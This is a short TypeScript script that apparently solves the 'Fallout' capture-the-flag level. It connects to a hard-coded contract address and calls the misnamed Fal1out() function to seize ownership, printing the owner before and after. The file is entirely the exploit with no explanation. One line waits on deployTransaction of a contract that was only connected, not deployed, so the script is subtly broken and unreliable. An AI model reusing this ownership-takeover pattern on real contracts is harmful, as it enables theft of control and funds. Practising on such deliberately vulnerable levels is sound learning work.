import { ethers, Signer } from "ethers";
import { getSigner } from "./signer";

import { Fallout__factory } from "../typechain/ethers-v5";
main()
  .then(() => {
    console.log("Done!");
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });


async function main() {

  const level = "0x5C697bf07f7B49120dEe53Afe0220681b49579C4";
  const signer = getSigner();  
  const fallout = Fallout__factory.connect(level, signer);
  console.log("owner:",await fallout.owner());
  await fallout.Fal1out();
  await fallout.deployTransaction.wait(1);
  console.log("owner:",await fallout.owner());
}
